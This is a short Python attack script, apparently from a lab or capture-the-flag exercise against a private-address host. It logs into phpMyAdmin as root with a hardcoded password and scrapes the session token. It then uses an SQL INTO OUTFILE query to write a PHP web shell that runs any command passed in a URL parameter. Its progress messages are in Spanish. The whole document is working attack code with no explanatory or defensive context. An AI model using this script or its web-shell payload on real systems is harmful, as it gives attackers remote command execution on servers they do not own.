import urllib.request, urllib.parse, http.cookiejar, re

url = 'http://10.10.30.11/phpmyadmin/'
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

resp = opener.open(url + 'index.php').read().decode()
token = re.search(r'token["\s:]+([a-f0-9]{32})', resp).group(1)

data = urllib.parse.urlencode({
    'pma_username': 'root',
    'pma_password': 'R00t-Maria!',
    'server': '1',
    'token': token
}).encode()
opener.open(url + 'index.php', data)

sql = "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/uploads/pma_shell.php'"
data2 = urllib.parse.urlencode({
    'sql_query': sql,
    'token': token,
    'server': '1'
}).encode()

resp2 = opener.open(url + 'index.php?route=/sql', data2).read().decode()
if 'error' in resp2.lower():
    print('FAILED - FILE privilege denegado o fichero ya existe')
else:
    print('OK - webshell escrita en /uploads/pma_shell.php')